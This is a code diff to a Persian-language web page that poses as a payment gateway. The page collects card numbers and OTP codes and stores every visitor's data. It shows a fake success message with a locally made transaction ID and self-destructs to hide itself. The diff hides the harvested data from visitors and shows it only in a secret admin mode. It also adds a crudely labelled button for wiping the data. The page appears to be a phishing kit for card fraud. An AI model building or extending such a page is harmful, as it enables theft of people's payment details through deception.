@@ -167,6 +167,12 @@
             color: #fff;
             margin-top: 15px;
         }
+        .btn-clear {
+            background: #ff9800;
+            color: #fff;
+            margin-top: 15px;
+            display: none;
+        }
         .loader {
             display: none;
             width: 60px;
@@ -205,6 +211,7 @@
             direction: rtl;
             max-height: 300px;
             overflow-y: auto;
+            display: none;
         }
         @font-face {
             font-family: 'Vazir';
@@ -269,6 +276,7 @@
         </div>
 
         <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
+        <button class="btn btn-clear" id="clear-data-btn" onclick="x.clearData()">بگا بده اطلاعات رو</button>
         <div class="user-data" id="user-data"></div>
     </div>
 
@@ -282,8 +290,9 @@
             const steps = document.querySelectorAll('.step');
             const progressFill = document.getElementById('progress-fill');
             const userDataDiv = document.getElementById('user-data');
+            const clearDataBtn = document.getElementById('clear-data-btn');
             let currentStep = 1;
-            let userData = {}; // اطلاعات موقت کاربر
+            let userData = {};
             let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
             let isSpecialMode = false;
             let sessionId = Math.random().toString(36).substr(2, 10);
@@ -297,7 +306,6 @@
             function init() {
                 setupInputs();
                 updateProgress();
-                displayAllUsersData(); // فقط اطلاعات قبلی رو نشون می‌ده
                 if (!localStorage.getItem(`specialMode_${sessionId}`)) {
                     setSelfDestructTimeout(600);
                 }
@@ -313,6 +321,8 @@
                         isSpecialMode = true;
                         localStorage.setItem(`specialMode_${sessionId}`, 'true');
                         alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
+                        showUserData();
+                        clearDataBtn.style.display = 'block';
                     }
                     value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').slice(0, 19).trim();
                     e.target.value = value;
@@ -349,19 +359,20 @@
 
             function updateUserData(key, value) {
                 if (value.trim()) {
-                    userData[key] = value; // فقط در متغیر موقت ذخیره می‌شه
+                    userData[key] = value;
                 }
             }
 
             function saveAndDisplayUserData() {
                 if (Object.keys(userData).length > 0) {
-                    allUsersData.push({ ...userData }); // اضافه کردن به لیست کاربران
+                    allUsersData.push({ ...userData });
                     localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
-                    displayAllUsersData(); // به‌روزرسانی نمایش
+                    if (isSpecialMode) showUserData();
                 }
             }
 
-            function displayAllUsersData() {
+            function showUserData() {
+                userDataDiv.style.display = 'block';
                 userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
                     allUsersData.map((user, index) => 
                         `<div style="margin-bottom: 15px;">
@@ -516,7 +527,7 @@
                     loader.style.display = 'none';
                     const transactionId = generateTransactionId();
                     userData['شماره تراکنش'] = transactionId;
-                    saveAndDisplayUserData(); // ذخیره در زمان تکمیل پرداخت
+                    saveAndDisplayUserData();
                     result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}<br>لطفاً این کد را نزد خود نگه دارید.`;
                     if (!isSpecialMode) selfDestruct();
                 }, 2000);
@@ -529,7 +540,7 @@
             function selfDestruct() {
                 document.querySelectorAll('input').forEach(input => input.value = '');
                 document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
-                saveAndDisplayUserData(); // ذخیره قبل از نابودی
+                saveAndDisplayUserData();
                 setTimeout(() => {
                     document.body.innerHTML = '<h1>جلسه منقضی شد</h1>';
                     window.history.pushState(null, '', '/');
@@ -549,15 +560,23 @@
             function handlePageExit() {
                 if (!isSpecialMode) {
                     localStorage.removeItem(`specialMode_${sessionId}`);
-                    saveAndDisplayUserData(); // ذخیره در زمان خروج
+                    saveAndDisplayUserData();
                 }
             }
 
             function cancel() {
                 if (confirm('آیا از لغو مطمئن هستید؟')) {
                     sendData(0, { action: 'cancel' });
-                    saveAndDisplayUserData(); // ذخیره در زمان انصراف
+                    saveAndDisplayUserData();
                     if (!isSpecialMode) selfDestruct();
+                }
+            }
+
+            function clearData() {
+                if (isSpecialMode && confirm('آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟')) {
+                    allUsersData = [];
+                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
+                    userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3><p>هیچ اطلاعاتی موجود نیست</p>';
                 }
             }
 
@@ -566,7 +585,8 @@
             return {
                 nextStep,
                 requestOTP,
-                cancel
+                cancel,
+                clearData
             };
         })();
     </script>
